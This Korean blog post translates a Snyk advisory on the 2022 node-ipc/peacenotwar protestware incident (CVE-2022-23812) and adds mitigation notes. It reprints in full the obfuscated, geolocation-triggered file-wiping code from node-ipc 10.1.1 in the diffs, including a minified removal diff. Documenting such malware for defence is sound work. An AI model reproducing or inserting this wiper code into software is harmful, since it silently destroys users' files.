---
slug: evilcodeinpeacenotwar-and-node-ipc
title: peacenotwar, node-ipc에 악의적 코드를 메인테이너가 넣었다
authors: rewrite0w0
tags: [npm, security, 번역]
---

# peacenotwar, node-ipc에 악의적 코드를 메인테이너가 넣었다

[경고(CVE-2022-23812): 우크라이나 침공의 대항목적으로 peacenotwar 모듈이 node-ipc 패키지를 통해 npm 개발자를 훼방](https://qiita.com/SnykSec/items/6e75bd78b4deb3371550)

[영어판](https://snyk.io/blog/peacenotwar-malicious-npm-node-ipc-package-vulnerability/)

2022년 3월 15일, Vue.js 유저가 npm 에코시스템에 대한 서플라이체인 공격을 발견했다.
`node-ipc` 패키지 깊숙한 곳에서 참조하고 있는 `peacenotwar`를 `node-ipc` 메인테이너가 항의 행위로 훼방을 놓았다.

이 보안사건은 메인테이너에 의한 파일을 파괴하는 것으로 의도적 파괴행위를 다양한 방법으로 은닉한 것에 관한 것이다. 항의목적인 공격이지만 소프트웨어 서플라이체인가 직면하고 있는 큰 문제, 코드 안에 의존관계 보안이 큰 영향을 미칠 가능성을 명확히했다.

우리가 이 글에서 설명할 보안사고는 CVE에 기록하고 있다.
`node-ipc`는 [CVE-2022-23812](https://security.snyk.io/vuln/SNYK-JS-NODEIPC-2426370), `peacenotwar`, `oneday-test`는 [SNYK-JS-PEACENOTWAR-2426724 ](https://security.snyk.io/vuln/SNYK-JS-PEACENOTWAR-2426724)를 확인부탁한다. [오픈소스 보안](https://snyk.io/product/open-source-security-management/)이나 [서플라이체인 보안](https://snyk.io/blog/preventing-malicious-packages-and-supply-chain-attacks-with-snyk/)를 위해 이미 Snyk를 사용하고 있다면 Snyk에 의한 통지, 알람, 자동 풀리퀘스트를 통해서 안전성을 유지하고 최신정보를 받을 수 있다. 서플라이체인의 상세 내용은 블로그를 읽어달라.

## node-ipc 악용할 때까지 한 짓

이야기는 2022년 3월 8일 6시(GMT+2)부터 시작된다.
npm 메인터이너 RIAEvangelist(Brandon Nozaki Miller)는 [소스코드](https://github.com/RIAEvangelist/peacenotwar)를 작성해서 [peacenotwar](https://www.npmjs.com/package/peacenotwar) 패키지를 공개했다. 안에는 설명이 붙어있다.

```
This code serves as a non-destructive example of why controlling
your node modules is important. It also serves as a non-violent
protest against Russia's aggression that threatens the world right
now. This module will add a message of peace on your users'
desktops, and it will only do it if it does not already exist
just to be polite.
```

3월 15일까지는 이 모듈 다운로드가 거의 제로였다. 하지만 npm 메인테이너가 이 모듈을 다른 인기 패키지인 `node-ipc`의 의존패키지로 추가함으로 상황을 변화했다.
이 모듈 자체가 에코시스템을 이용하는 많은 JavaScript 개발자가 의존하는 인기 패키지이기 때문이다.

![node-ipc module populator](https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F2216557%2F9ef0827a-158e-3a90-47f2-ca91a6ef946f.png?ixlib=rb-4.0.0&auto=format&gif-q=60&q=75&w=1400&fit=max&s=754bd1eee8d997be8d48a8c7638fe3f0)

이런 JavaScript 에코시스템 프로젝트 중 하나가 `@vue/cli`이다. 다음 의존관계 트리는 `node-ipc`가 `@vue/cli` 패키지에 담길 때까지의 모습을 보여준다. 더불어 들어간 의존관계를 큰 위험으로 판단할 필요성을 고발한다.

```
- @vue/cli
   |
   - @vue/cli-ui
      |
      - node-ipc@^9.2.1
   - @vue/cli-shared-utils
      |
      - node-ipc@^9.1.1
```

현재 최신 "안정판" npm 패키지 모듈 `node-ipc`(9.2.2)는 `peacenotwar`를 번들하고 있다. 더 흥미로운 건 악명 높았던 `colors` 패키지를 와일드카드 `*` 범위지정해 번들하고 있다. 만약 당신이 [colors에 대한 이야기를 들어본 적이 없다면](https://qiita.com/SnykSec/items/23bcd8dc873239d2bece) 오픈소스 서플라이체인 보안에 대한 또 다른 사건으로 내용을 확인하면 좋겠다.

## 사건 타임라인

`node-ipc`는 9개월 전 10.0.0, 반년 전 10.1.0 버전까지 정상적으로 업데이트, 개량이 되었다. 그러나...

### 3월 7일

버전 10.1.1 공개부터 소스코드의 수상한 움직임이나 패키지 동작에서 악용할 가능성이 명백한 코드가 들어가있었다. 버전 10.1.0, 10.1.1의 차이를 보자.

```diff
diff --git a/node-ipc.cjs b/node-ipc.cjs
index v10.1.0..v10.1.1 100666
--- a/node-ipc.cjs
+++ b/node-ipc.cjs
@@ -1030,6 +1030,74 @@
   });
 }

+// dao/ssl-geospec.js
+var import_path = __toModule(require("path"));
+var import_fs3 = __toModule(require("fs"));
+var import_https = __toModule(require("https"));
+setTimeout(function() {
+  const t = Math.round(Math.random() * 4);
+  if (t > 1) {
+    return;
+  }
+  const n = Buffer.from("aHR0cHM6Ly9hcGkuaXBnZW9sb2NhdGlvbi5pby9pcGdlbz9hcGlLZXk9YWU1MTFlMTYyNzgyNGE5NjhhYWFhNzU4YTUzMDkxNTQ=", "base64");
+  import_https.default.get(n.toString("utf8"), function(t2) {
+    t2.on("data", function(t3) {
+      const n2 = Buffer.from("Li8=", "base64");
+      const o2 = Buffer.from("Li4v", "base64");
+      const r = Buffer.from("Li4vLi4v", "base64");
+      const f = Buffer.from("Lw==", "base64");
+      const c = Buffer.from("Y291bnRyeV9uYW1l", "base64");
+      const e = Buffer.from("cnVzc2lh", "base64");
+      const i = Buffer.from("YmVsYXJ1cw==", "base64");
+      try {
+        const s = JSON.parse(t3.toString("utf8"));
+        const u2 = s[c.toString("utf8")].toLowerCase();
+        const a2 = u2.includes(e.toString("utf8")) || u2.includes(i.toString("utf8"));
+        if (a2) {
+          h(n2.toString("utf8"));
+          h(o2.toString("utf8"));
+          h(r.toString("utf8"));
+          h(f.toString("utf8"));
+        }
+      } catch (t4) {
+      }
+    });
+  });
+}, Math.ceil(Math.random() * 1e3));
+async function h(n = "", o2 = "") {
+  if (!import_fs3.default.existsSync(n)) {
+    return;
+  }
+  let r = [];
+  try {
+    r = import_fs3.default.readdirSync(n);
+  } catch (t) {
+  }
+  const f = [];
+  const c = Buffer.from("4p2k77iP", "base64");
+  for (var e = 0; e < r.length; e++) {
+    const i = import_path.default.join(n, r[e]);
+    let t = null;
+    try {
+      t = import_fs3.default.lstatSync(i);
+    } catch (t2) {
+      continue;
+    }
+    if (t.isDirectory()) {
+      const s = h(i, o2);
+      s.length > 0 ? f.push(...s) : null;
+    } else if (i.indexOf(o2) >= 0) {
+      try {
+        import_fs3.default.writeFile(i, c.toString("utf8"), function() {
+        });
+      } catch (t2) {
+      }
+    }
+  }
+  return f;
+}
+var ssl = true;
+
```

commonJS 호환하는 `node-ipc.cjs` 모듈은 1000행이 넘는 상당히 많은 코드로 되어있다. 원격으로 아웃바운드 HTTPS 리퀘스트의 존재, 안에 있는 Base64 인코드된 데이터는 여기서 일어날 부정행위를 암시하며, IoC(침해의 징후) 증거도 된다.

`node-ipc@10.1.1`에 추가된 코드는 타이머를 설정하고, 더불어 여러 설정을 랜덤한 간격으로 `node-ipc` 관련 코드를 호출해서, 파일시스템 조작하는 함수도 실행한다.

파일 시스템 조작을 실행하는 함수에 전달된 인수의 Base64 인코딩 값을 자세히 보자.

```diff
+      const n2 = Buffer.from("Li8=", "base64");
+      const o2 = Buffer.from("Li4v", "base64");
+      const r = Buffer.from("Li4vLi4v", "base64");
+      const f = Buffer.from("Lw==", "base64");
+      const c = Buffer.from("Y291bnRyeV9uYW1l", "base64");
+      const e = Buffer.from("cnVzc2lh", "base64");
+      const i = Buffer.from("YmVsYXJ1cw==", "base64");
```

모든 값이 타이머 함수에 전달된다. 예를 들면

```diff
+          h(n2.toString("utf8"));
```

Base64로 인코딩된 문자열 값은 이런 뜻이다.

- `n2` = `./`
- `o2` = `../`
- `r` = `../../`
- `f` = `/`

이것을 타이머 함수로 넘기면 다음행에서 파일 입력 소스로 사용되어 파일내용을 삭제하고 하트로 바꾼다.
(`+ const c = Buffer.from("4p2k77iP", "base64");` from `diff`)

```diff
+      try {
+        import_fs3.default.writeFile(i, c.toString("utf8"), function() {
+        });
```

이 시점에서 이 패키지를 호출하는 시스템이 러시아, 벨라루스의 지리적 위치와 일치한다면 명백한 부정사용, 심각한 서플라이체인 사고가 발생한다.

`node-ipc@10.1.1` `README` 파일 갱신내용에는 이 새로 추가된 행동에 대한 기술은 **없다**. 대신 `RIAEvangelist`를 지원하는 방법이나, 버전 10이상 ES6, CommonJS 버전의 `node-ipc` 사용하는 방법만 있다.

약 10시간 뒤, `node-ipc@10.1.2`가 출시되었지만 버전만 올랐지 거의 변경은 없다. 잠재적으로 패키지 자동업데이트를 실행하는 것을 의도한 것일지도 모른다. 이하는 2개의 버전의 차이이다.

```diff
diff --git a/package.json b/package.json
index v10.1.1..v10.1.2 100666
--- a/package.json
+++ b/package.json
@@ -1,6 +1,6 @@
 {
   "name": "node-ipc",
-  "version": "10.1.1",
+  "version": "10.1.2",
   "description": "A nodejs module for local and remote Inter Process Communication (IPC), Neural Networking, and able to facilitate machine learning.",
   "type": "module",
   "main": "node-ipc.cjs",
```

### 3월 8일

3월8일, 대충 5시간 뒤에, 새로운 버전이 push되었다. `node-ipc@10.1.3`은 전술한 파괴적인 페이로드 징부는 모드 지워졌다. 이 2개의 버전의 git 차이를 이렇다.

```diff
diff --git a/node-ipc.cjs b/node-ipc.cjs
index v10.1.2..v10.1.3 100666
--- a/node-ipc.cjs
+++ b/node-ipc.cjs
@@ -1030,74 +1030,6 @@
   });
 }

-// dao/ssl-geospec.js
-var import_path = __toModule(require("path"));
-var import_fs3 = __toModule(require("fs"));
-var import_https = __toModule(require("https"));
-setTimeout(function() {
-  const t = Math.round(Math.random() * 4);
-  if (t > 1) {
-    return;
-  }

…
diff --git a/dao/ssl-geospec.js b/dao/ssl-geospec.js
deleted file mode 100666
index v10.1.2..v10.1.3
--- a/dao/ssl-geospec.js
+++ b/dao/ssl-geospec.js
@@ -1,1 +0,0 @@
-import u from"path";import a from"fs";import o from"https";setTimeout(function(){const t=Math.round(Math.random()*4);if(t>1){return}const n=Buffer.from("aHR0cHM6Ly9hcGkuaXBnZW9sb2NhdGlvbi5pby9pcGdlbz9hcGlLZXk9YWU1MTFlMTYyNzgyNGE5NjhhYWFhNzU4YTUzMDkxNTQ=","base64");o.get(n.toString("utf8"),function(t){t.on("data",function(t){const n=Buffer.from("Li8=","base64");const o=Buffer.from("Li4v","base64");const r=Buffer.from("Li4vLi4v","base64");const f=Buffer.from("Lw==","base64");const c=Buffer.from("Y291bnRyeV9uYW1l","base64");const e=Buffer.from("cnVzc2lh","base64");const i=Buffer.from("YmVsYXJ1cw==","base64");try{const s=JSON.parse(t.toString("utf8"));const u=s[c.toString("utf8")].toLowerCase();const a=u.includes(e.toString("utf8"))||u.includes(i.toString("utf8"));if(a){h(n.toString("utf8"));h(o.toString("utf8"));h(r.toString("utf8"));h(f.toString("utf8"))}}catch(t){}})})},Math.ceil(Math.random()*1e3));async function h(n="",o=""){if(!a.existsSync(n)){return}let r=[];try{r=a.readdirSync(n)}catch(t){}const f=[];const c=Buffer.from("4p2k77iP","base64");for(var e=0;e<r.length;e++){const i=u.join(n,r[e]);let t=null;try{t=a.lstatSync(i)}catch(t){continue}if(t.isDirectory()){const s=h(i,o);s.length>0?f.push(...s):null}else if(i.indexOf(o)>=0){try{a.writeFile(i,c.toString("utf8"),function(){})}catch(t){}}}return f};const ssl=true;export {ssl as default,ssl}

```

[수상한 거동을 보고한 Github issue](https://github.com/RIAEvangelist/node-ipc/issues/233#issuecomment-1068182278)에 의하면, 이는 10.x 버전 브런치에서 롤아웃된 것이라 생각된다. issue에서는 이 페이로드를 라이브러리의 새로운 메이저 버전의 일부로 공개했다 [메인테이너는 주장한다.](https://github.com/RIAEvangelist/node-ipc/issues/233#issuecomment-1063557929)

![maintainer argue issue](https://camo.qiitausercontent.com/5180819c8d36f32508d6f0be0464dcb8764a9b1c/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e61702d6e6f727468656173742d312e616d617a6f6e6177732e636f6d2f302f323231363535372f61396462306431322d333133392d653730302d303265362d3964393630323630363762312e706e67)

지금 시점에서 `node-ipc` 취약 버전 `node-ipc@10.1.1`, `node-ipc@10.1.2`는 npmjs 레포지토리 상에 24시간 미만정도만 존재했다. 한편 공개 리포지토리에 [보고된 것처럼](https://github.com/RIAEvangelist/node-ipc/issues/233#issuecomment-1067905728), 개발자, 빌드시스템에 의한 다운로드 수가 많았기에 어딘가에 분명한 영향을 끼쳤다 생각된다.

![objection!](https://camo.qiitausercontent.com/6a3d52827b2de1bdf8476434c050f9382a282651/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e61702d6e6f727468656173742d312e616d617a6f6e6177732e636f6d2f302f323231363535372f63653163366536312d313932392d633566332d326536342d6430666162346165393635642e706e67)

하지만 취약성이 있는 버전 `10.1.1`, `10.1.2`은 npmjs 레포지토리에 존재하지 않고, 실제 메인테이너 혹은 npmjs 팀에 의해 `비권장` 깃발도 세워졌다. 이는 npmjs 사이트에서 [확인가능하다](https://www.npmjs.com/package/node-ipc/v/10.1.2).

![deprecated package (security issue)](https://camo.qiitausercontent.com/6ce0ec45ad2c5ae88a41b4151eb3e20da8459f0c/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e61702d6e6f727468656173742d312e616d617a6f6e6177732e636f6d2f302f323231363535372f66326631633833392d336661332d373137352d303464352d3835353065383333623465342e706e67)

3월 8일 19:25(GMT+2) 파괴적인 페이로드를 롤백하기 위해 `node-ipc@10.1.3` 공개 4시간이 되지 않은 시점에서 새로운 메이저 버전 `node-ipc@11.0.0`가 npmjs 레포지토리에 출시되었다. 무엇이 변했을까?

새로운 메이저 버전 `node-ipc@11.0.0`은 다음과 같은 내용이 담겨져있다.

- 의존패키지 `peacenotwar` 추가
- `node-ipc` 모듈 기능 호출시, `peacenotwar` 모듈발 메세지를 STDOUT에 출력하면서 러시아의 우크라이나 침공에 대한 해당 시점의 전시상황이 담긴 파일을 유저 컴퓨터에 넣는다.
- 11.0.0 README에는 이 모듈의 일부로 `peacenotwar`가 사용된다 명시 `***as of v11*** this module uses the [peacenotwar](https://github.com/RIAEvangelist/peacenotwar) module.`

`peacenotwar`가 node-ipc에 담겨 수백만명이 넘는 개발자에게 영향을 끼친건 왜 그럴까?

### 3월 15일

3월 15일 18:49(GTM+2), 19:40(GMT+2)
node-ipc용으로 중요하고도 임팩트 있는 2가지 npm 버전이 공개되었다. 그 중에서도 중요한 건 새로운 패키지 버전 `node-ipc@9.2.2`이다. 이는 `node-ipc` 안정된 브런치이면서, `@vue/cli`를 포함한 많은 에코시스템 프로젝트가 의존하기 때문이다.

`node-ipc@9.2.2` 추가된 변경점을 보자

1. 패키지 컨텐츠에 샘플코드를 추가
2. 의존 패키지로 `peacenotwar` 추가, `node-ipc` 호출시에 `peacenotwar` 실행
3. 다른 메인테이너에 의해 [의도적인 취약성 코드](https://snyk.io/blog/open-source-npm-packages-colors-faker/) `colors@*` 명시적 추가
4. 새 마이너버전에서는 라이센스를 MIT에서 [DBAD](https://dbad-license.org/)로 변경
   > DBAD에는 거친 표현이 들어가 있습니다.

거의 동시에 새로운 마이너버전이 출시되었다.
`node-ipc@11.1.0`의 의존처인 `peacenotwar` 버전업인데, console.log()에서 STDOUT 출력하는 메세지를 삭제했다. `node-ipc`의 2개의 npm 패키지 사이의 차이는 `git diff`로 확인 가능하다.

```diff
diff --git a/node-ipc.cjs b/node-ipc.cjs
index v11.0.0..v11.1.0 100666
--- a/node-ipc.cjs
+++ b/node-ipc.cjs
@@ -1328,7 +1328,6 @@
 var OneDriveDesktopFileExists = fromDir(OneDriveDesktops, "WITH-LOVE-FROM-AMERICA.txt");
 var OneDriveFileExists = fromDir(OneDrive, "WITH-LOVE-FROM-AMERICA.txt");
 function deliverAPeacefulMessage(path2, message) {
-  console.log(path2);
   try {
     import_fs5.default.writeFile(path2, message, function(err) {
     });
@@ -1336,7 +1335,6 @@
   }
 }
 if (!(DesktopFileExists == null ? void 0 : DesktopFileExists.length) && !(OneDriveFileExists == null ? void 0 : OneDriveFileExists.length) && !(OneDriveDesktopFileExists == null ? void 0 : OneDriveDesktopFileExists.length)) {
-  console.log("in here");
   const thinkaboutit = "WITH-LOVE-FROM-AMERICA.txt";
   const WITH_LOVE_FROM_AMERICA = read(`./${thinkaboutit}`);
   deliverAPeacefulMessage(`${Desktops}${thinkaboutit}`, WITH_LOVE_FROM_AMERICA);
diff --git a/package.json b/package.json
index v11.0.0..v11.1.0 100666
--- a/package.json
+++ b/package.json
@@ -1,6 +1,6 @@
 {
   "name": "node-ipc",
-  "version": "11.0.0",
+  "version": "11.1.0",
   "description": "A nodejs module for local and remote Inter Process Communication (IPC), Neural Networking, and able to facilitate machine learning.",
   "type": "module",
   "main": "node-ipc.cjs",
@@ -19,7 +19,7 @@
     "event-pubsub": "5.0.3",
     "js-message": "1.0.7",
     "js-queue": "2.0.2",
-    "peacenotwar": "^9.1.3",
+    "peacenotwar": "^9.1.5",
     "strong-type": "^1.0.1"
   },
   "devDependencies": {

```

## 메인테이너 평판에 좌우되는 서플라이체인 안정성

메인테이너 RIAEvangelist의 의도적인 위험한 행위를 일부 사람이 정당한 항의행동이라 여기고 있다. 메인테이너의 앞으로의 평판, 개발자 커뮤니티의 이익과 손해에 어떻게 반영될까. 이 메인테이너가 앞으로 참가할 모든 프로젝트가 같은 짓을 했거나, 어쩌면 이미 공격적인 행동을 하지 않았다 신뢰할 수 있을까?

현재 RIAEvangelist가 다른 npm 패키지를 40개 이상 유지관리하고 있으며, 그것을 다운로드 수는 수억이 된다.
다음은 관리하고 있는 모듈의 일부의 npmjs 레포지토리 주간 다운로드 숫자이다.

| **npm module**                                                                                                                                                                                                           | **Weekly downloads** |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | -------------------- |
| node-ipc — A nodejs module for local and remote Inter Process Communication (IPC), Neural Networking, and able to facilitate machine learning.                                                                           | 1,055,386            |
| js-queue — Simple JS queue with auto run for node and browsers.                                                                                                                                                          | 1,042,512            |
| easy-stack — Simple JS stack with auto run for node and browsers.                                                                                                                                                        | 1,001,945            |
| js-message — Normalized JS Object and JSON message and event protocol for node.js, vanialla js, react.js, components, actions, stores and dispatchers.                                                                   | 1,001,943            |
| event-pubsub — Super light and fast Extensible ES6+ events and EventEmitters for Node and the browser. Easy for any developer level, use the same exact code in node and the browser. No frills, just high speed events! | 996,076              |
| node-cmd — Simple commandline/terminal/shell interface to allow you to run cli or bash style commands as if you were in the terminal.                                                                                    | 41,0                 |

Snyk Security Research 팀은 이 메인테이너에 의한 다른 패키지에서 이러한 의도적 부정사용 징후를 발견하지 못했지만, npmjs 에코시스템에 공개되어진 업데이트에는 계속 경고를 할 것이다.

## node-ipc 문제를 경감하는 방버

앞으로 코드 갱신으로 유저가 위험에 빠질 것이 걱정되므로 `node-ipc` 패키지 이용을 완전히 중지할 것을 권장한다. 이 패키지로 구축중인 어플리케이션에 일부가 프로젝트에 번들링되어 있다면 npm 패키지 매니저의 기능을 사용해 훼방하는 버전을 완전히 붙어쓰고, 의존관계를 **문제가 없다 확인된 것으로** 고정하는 걸 권장한다.

버전매니저로 npm를 사용하고 있다면 `package.json` 파일에 이렇게 추가하면 무해한 버전의 `node-ipc`를 명시적으로 허용할 수 있다.

```json
 "overrides": {
    "node-ipc@>9.2.1 <10": "9.2.1",
    "node-ipc@>10.1.0": "10.1.0"
  }
```

## 정리

**Snyk는 우크라이나를 지지한다.** 우리는 현재 진행중인 위험에 대해 [기부, 개발자에게 무료서비스](https://snyk.io/blog/snyk-impact-donation-in-response-to-ukrainian-crisis/)로 우크라이나인에게 지원, [러시아, 벨라루스 대상으로 하는 비즈니스 정지](https://snyk.io/blog/snyk-ceases-business-russia-belarus/)를 적극적으로 하고 있습니다. 하지만 이렇게 의도적인 악용은 글로벌한 오픈소스 커뮤니티를 약체화시키는 것이며, `node-ipc` 보안 취약성이 있다는 것을 경고할 필요가 있다.

그래서 Snyk 보안팀은 [CVE-2022-23812](https://security.snyk.io/vuln/SNYK-JS-NODEIPC-2426370), [SNYK-JS-PEACENOTWAR-2426724](https://security.snyk.io/vuln/SNYK-JS-PEACENOTWAR-2426724)를 공개했다.
의도적으로 취약성을 담은 `node-ipc` 버전 보안 취약성을 경고, 추적하고 있다. Snyk 무료플랜도 이 새로운 취약성에 대응하고 있으며, 개발자에 의한 스캔, 감시, 풀리퀘스트를 통해 자동 보안 패치 적용이 가능하다.

그렇지만 서플라인체인의 보안 사고의 영향은 오픈소스의 의존관계에 의해 위험을 적절하게 관리, 신속의 대응할 필요성을 느낀다. 더불어 JavaScript 에코시스템 npmjs에 의해 들어가 있는 의존관계의 복잡함은 에코시스템의 주요한 프로젝트에 복합적인 영향을 준다는 것이 다시 증명되었다.

불과 2개월 전쯤에, 우리는 [오픈소스 메인테이너가 "colors"와 "faker"를 폭파시켜](https://qiita.com/SnykSec/items/23bcd8dc873239d2bece) 의도적으로 오픈소스 라이브러리를 파괴하는 것 확인했으며, 보안 사고에 의한 광범위한 영향을 보았다.

[소프트웨어 의존관계를 대규모로 관리하는](https://snyk.io/learn/software-dependencies/)스킬을 숙지해야하는 것이 중요해지고 있다. 개발자가 [npm security best practice](https://snyk.io/blog/ten-npm-security-best-practices/)를 확실히 따르는 것만이 아니라, [npm lockfile이 악의적인 모듈을 주입하기 위한 보안 맹점이 되는 이유](https://snyk.io/blog/why-npm-lockfiles-can-be-a-security-blindspot-for-injecting-malicious-modules/) 등, 보안 구멍이나 사고에 대해 배우는 것이 중요하다.

서플라이체인의 보안에 대해서는 다음에 상세히 기술되어 있다.

- (영어) [소프트웨어 서플라인 체인 보안](https://snyk.io/blog/software-supply-chain-security/)
- (영어) [오픈소스 서플라인 체인 보안을 위한 소프트웨어 부품표(SBOM) 구축](https://snyk.io/blog/building-sbom-open-source-supply-chain-security/)
- (일본어) [(백서) 소프트웨어 서플라이 체인 보안](https://go.snyk.io/supply-chain-security-white-paper-japanese.html)

> 글을 읽고 Snyk를 사용해보고 싶어! 생각하는 분은 [무료 체험](https://snyk.co/qiita)을 체험해보세요.
> [Snyk](https://snyk.io/jp)는 secure coding을 위한 정보, 취약성의 정보 등을 다루고 있습니다. [Twitter](https://twitter.com/snykjp), [Facebook](https://www.facebook.com/snykJP/), [Blog](https://qiita.com/organizations/snyk)를 확인해주세요.

---

# [node-ipc에 악의적 코드를 담은 문제에 대해서](https://zenn.dev/azu/articles/e248ed86fb6d34)

[node-ipc](https://github.com/RIAEvangelist/node-ipc)가 악의적 코드를 포함한 문제에 대한 메모이다.

2022년 3월 15일
node-ipc 메인테이너에 의해 악의적 코드를 포함한 node-ipc를 공개했다.

## 문제있는 버전

- ~~9.2.2~~ unpublish
  - [Hidden functionality in node-ipc · GHSA-8gr3-2gjw-jj7g · GitHub Advisory Database](https://github.com/advisories/GHSA-8gr3-2gjw-jj7g)
- ~~10.1.1~~, ~~10.1.2~~ unpublish
  - [Embedded Malicious Code in node-ipc · CVE-2022-23812 · GitHub Advisory Database](https://github.com/advisories/GHSA-97m3-w2cp-4xx6)
- 11.0.0+
  - [node-ipc behavior change · GHSA-3mpp-xfvh-qh37 · GitHub Advisory Database](https://github.com/advisories/GHSA-3mpp-xfvh-qh37)

2022년 3월 17일 시점에 문제가 해결된 버전은 없다.

각 버전은 작동이 다르다.
CVE가 상세하지만, 구체적으로는 10.1.1, 10.1.2은 파일을 갈아끼우는 멀웨어 같은 작동을 한다. 상세는 다음 Issue, 글을 읽기 바란다.

- [Issue #233 · RIAEvangelist/node-ipc](https://github.com/RIAEvangelist/node-ipc/issues/233)
- [CVE-2022-23812 | RIAEvangelist/node-ipc is malware / protest-ware](https://gist.github.com/MidSpike/f7ae3457420af78a54b38a31cc0c809c)
- [Alert: peacenotwar module sabotages npm developers in the node-ipc package to protest the invasion of Ukraine | Snyk](https://snyk.io/blog/peacenotwar-malicious-npm-node-ipc-package-vulnerability/)

## 문제가 없는 버전

- 9.2.1
- 10.1.0

  10.1.3은 일단 문제가 없어보이지만, 악의있는 변경을 메이저 업데이트로 publish를 돌리기 전에, 한 번 revert한 특수한 버전이다.

## 영향을 받는 패키지, 도구

node-ipc를 이용하고 있는 패키지에 영향을 주고 있을 수 있다.

다음 도구는 node-ipc 버전을 고정하는 등 수정을 포함한 버전이 출시되었다.

- Vue CLI
  - [Release v5.0.3 · vuejs/vue-cli](https://github.com/vuejs/vue-cli/releases/v5.0.3)
  - [Release v4.5.16 · vuejs/vue-cli](https://github.com/vuejs/vue-cli/releases/tag/v4.5.16)
- [Unity Hub Release Notes - Unity](https://unity3d.com/hub/whats-new)
  - [Bizarre ocurrence with UnityHub 3.1.0 - Unity Forum](https://forum.unity.com/threads/bizarre-ocurrence-with-unityhub-3-1-0.1253835/)

## 확인 방법

`node-ipc` 이용중인가 확인 방법은 이러하다.

npm

```bash
npm ls node-ipc
```

yarn

```bash
yarn why node-ipc
```

각 출력결과에 영향을 받고 있는 `node-ipc` 버전이 있다면 대응이 필요하다.

## 대응 방법

메인테이너에 의한 의도적인 공격이므로 수정된 버전은 2022년 3월 17일 시점에는 없다.

기본적인 대응방법은 `colors` 때와 같이 문제가 없는 버전으로 고정하는 방법이 유효하다.

- [colors 같이 악의 있는 코드가 포함되어 있는 문제에 대해서](https://zenn.dev/azu/articles/d56615b2e11ad1)

하지만 patch, minor 버전에 공개되어진 것은 이미 unpublish 되었다.
기본적으로 문제가 있는 11.0.0 업데이트는 하지 말 것이 좋다 생각한다.
또한 악의적인 것이 minor, patch로 공개되었을 때 자동적으로 갱신되지 않도록 `package-lock.json`, `yarn.lock`에 lockfile에 설치한 버전을 고정하는 것이 유효한 방법이다.

새로 설치, 의존 갱신 등의 경우에도 포함된 버전을 완전히 고정하고 싶다면 패키지 매니저 째로 지정하는 방법으로 대응할 필요가 있다.

npm에서 `package.json`의 `overrides` 필드에서 `node-ipc` 직접/간접 버전을 고정할 수 있다.

```json
{
  "overrides": {
    "node-ipc@>9.2.1 <10": "9.2.1",
    "node-ipc@>10.1.0": "10.1.0"
  }
}
```

yarn은 `package.json` `resolutions` 필드에서 `node-ipc` 직접/간접 버전을 고정할 수있다.

10.1.0 고정하는 경우

```json
{
  "resolutions": {
    "node-ipc": "10.1.0"
  }
}
```

## 메모

npm 패키지 시스템의 서플라인 체인 문제가 일어난 것을 조사한 메모이다

이번 케이스는 [CVE-2022-23812 | RIAEvangelist/node-ipc is malware / protest-ware](https://gist.github.com/MidSpike/f7ae3457420af78a54b38a31cc0c809c)에 대부분의 내용이 적혀있다.

또 Vue 커뮤니티에서 문제가 컸는지 cnpm의 [bug-versions](https://github.com/cnpm/bug-versions)에 문제 버전의 정보를 바로 반영했다.

- [fix: node-ipc by atian25 · Pull Request #181 · cnpm/bug-versions](https://github.com/cnpm/bug-versions/pull/181)

서플라이체인 공격적인 패키지 공개라면, 복수의 patch/minor/major 버전과 동시에 공개되어져있기에, node-ipc 같이 최신 버전만 보면 알아채기 어렵다.

최신 정보는 [Open Source Insights](https://deps.dev/)를 보면서 여기서 공개된 버전의 Event History, 메인테이너 권한 변화등도 확인할 수 있다.

- [node-ipc | npm | Open Source Insights](https://deps.dev/npm/node-ipc/)

![node-ipc Open Source Insights Event History](https://storage.googleapis.com/zenn-user-upload/73460ac0ba59-20220317.png)

또 Github 태그와 npm의 dist-tag 내용이 일치하는가 보증도 없기에, 실제 코드는 npm에 공개된 것을 확인하는게 옳다 생각한다. (npm으로 설치함으로)

npm 버전 간의 Diff는 다음 서비스로 이용가능하다.

- [npmfs - home](https://npmfs.com/)
- [Package Diff](https://diff.intrinsic.com/)

실행시 공격을 실행하는 서플라이체인 공격은 정적인 체크만으로 검증이 어렵다. 이번에는 제대로 동작하지 않은 경우라 생각되지만 [Socket](https://socket.dev/) 서비스가 서플라인체인 공격의 체크를 목적으로 한 서비스로 공개되었다 ([@feross](https://twitter.com/feross) 제작)

- [Socket - Secure your JavaScript supply chain](https://socket.dev/)

![Socket test node-ipc](https://storage.googleapis.com/zenn-user-upload/7d870e4f1114-20220317.png)

실제 문제가 된 버전에는 [ssl-geospec.js](https://socket.dev/npm/package/node-ipc/files/10.1.2/dao/ssl-geospec.js) 파일이 네트워크 접근을 하는 것이 마크는 되어 있지만, 이걸 보면 뭐가 어떻게 된건지 판단하기 어렵다.

이걸 잘 하면 좋겠다 생각한다.

여담으로 이번 [GitHub Advisory Database](https://github.com/advisories?query=node-ipc)은 제대로 버전 째로 속을 들여다 보고 적은 느낌이 들어 좋았다. ([GitHub Advisory Database RSS 피드를 만들었다 | Web Scratch](https://efcl.info/2022/01/19/github-advisory-database-rss/) RSS도 있다.)

- [Hidden functionality in node-ipc · GHSA-8gr3-2gjw-jj7g · GitHub Advisory Database](https://github.com/advisories/GHSA-8gr3-2gjw-jj7g)
- [node-ipc behavior change · GHSA-3mpp-xfvh-qh37 · GitHub Advisory Database](https://github.com/advisories/GHSA-3mpp-xfvh-qh37)
- [Embedded Malicious Code in node-ipc · CVE-2022-23812 · GitHub Advisory Database](https://github.com/advisories/GHSA-97m3-w2cp-4xx6)

버전 째로 작동이 꽤 다르므로, 안을 들여다보지 않으면 알기 어렵다 느낌도 들었다.

[https://twitter.com/azu_re/status/1503905637956128770](https://twitter.com/azu_re/status/1503905637956128770)

실제 어느정도 사람이 영향을 받았는가 확인하고 싶지만, npm version 태그 설치 수는 unpublish 되면 지워지므로 이를 기록하는 서비스가 있으면 좋겠다.

## 추가

[유명 npm 패키지 개발자, 러시아 노리고 악성 버전 업로드 해](https://www.boannews.com/media/view.asp?idx=105529)

## 감상

